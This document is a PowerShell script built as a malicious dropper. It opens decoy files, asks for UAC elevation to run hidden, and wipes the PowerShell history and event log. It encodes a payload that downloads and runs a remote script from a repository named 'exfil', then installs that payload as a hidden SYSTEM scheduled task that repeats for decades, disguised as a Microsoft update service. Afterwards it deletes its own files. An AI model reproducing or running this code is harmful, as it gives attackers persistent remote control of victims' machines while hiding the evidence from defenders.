#Variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$localtask = "RegBackupVerifier"
$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
##Do Not use the option in repo env, only for production env.
$runcleanup = $false

# File Opening.
$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
$searchPattern = "*assign*.*"
$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.Name.StartsWith("~$") }
if ($matchingFiles) {
    foreach ($file in $matchingFiles) {
        Write-Host "Opening file: $($file.FullName)"
        Invoke-Item -Path $file.FullName
    }
} else {
    Write-Host "No files matching the search pattern '$searchPattern' found in directory '$scriptDirectory'."
}

# Admin Check and execution bypass with window hidden.
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "Script is not running with administrative privileges. Prompting for UAC elevation..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

#Install WindowsUpdateService
$rawscript = @'
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$url = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/ActiveAccessControl.ps1"
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
if ($response.StatusCode -eq 200) {
$scriptContent = $response.Content
Invoke-Expression $scriptContent
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawscript)
$enccmd = [Convert]::ToBase64String($bytes)

# Actions for scheduled task.
$STAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enccmd"

# Triggers for scheduled task.
$STTrigger = New-ScheduledTaskTrigger `
    -Once -At ([DateTime]::Now.AddSeconds(10)) `
    -RepetitionDuration (New-TimeSpan -Days (365 * 50)) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) 

# Settings for scheduled task
$STSettings = New-ScheduledTaskSettingsSet `
    -Compatibility Win8 `
    -MultipleInstances IgnoreNew `
    -RestartInterval (New-TimeSpan -Minutes 5) `
    -RestartCount:9999 `
    -ExecutionTimeLimit:0 `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -DisallowHardTerminate `
    -Priority 0 `
    -Hidden 

# Registering the scheduled task.
if (Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $localtask -Confirm:$false -ErrorAction SilentlyContinue
}
Register-ScheduledTask `
    -Action $STAction `
    -Trigger $STTrigger `
    -Settings $STSettings `
    -TaskName $localtask `
    -Description "Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment." `
    -User "NT AUTHORITY\SYSTEM" `
    -RunLevel Highest | Out-Null

# Post Registration settings.
$TargetTask = Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue
$TargetTask.Author = 'Microsoft Corporation'
$TargetTask.Settings.volatile = $False
$TargetTask | Set-ScheduledTask | Out-Null

#cleanup-script
if ($runcleanup) {
    # Unhide all hidden files in the script directory
    Get-ChildItem -Path $PSScriptRoot -Force | Where-Object { $_.Attributes -band [System.IO.FileAttributes]::Hidden } | ForEach-Object {
        $_.Attributes = $_.Attributes -bxor [System.IO.FileAttributes]::Hidden
        Write-Output "Unhid file: $($_.FullName)"
    }
    # Remove files with specified extensions from the script directory
    $extensions = @(".bat", ".cmd", ".vbs", ".ps1")
    foreach ($extension in $extensions) {
        $files = Get-ChildItem -Path $PSScriptRoot -Filter "*$extension" -File
        foreach ($file in $files) {
            Remove-Item -Path $file.FullName -Force
        }
    }
} else {}

#powershell-cleanup.
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
    $files = Get-ChildItem -Path $psreadlineFolderPath
    if ($files.Count -gt 0) {
        Remove-Item -Path "$psreadlineFolderPath\*" -Force
    }
}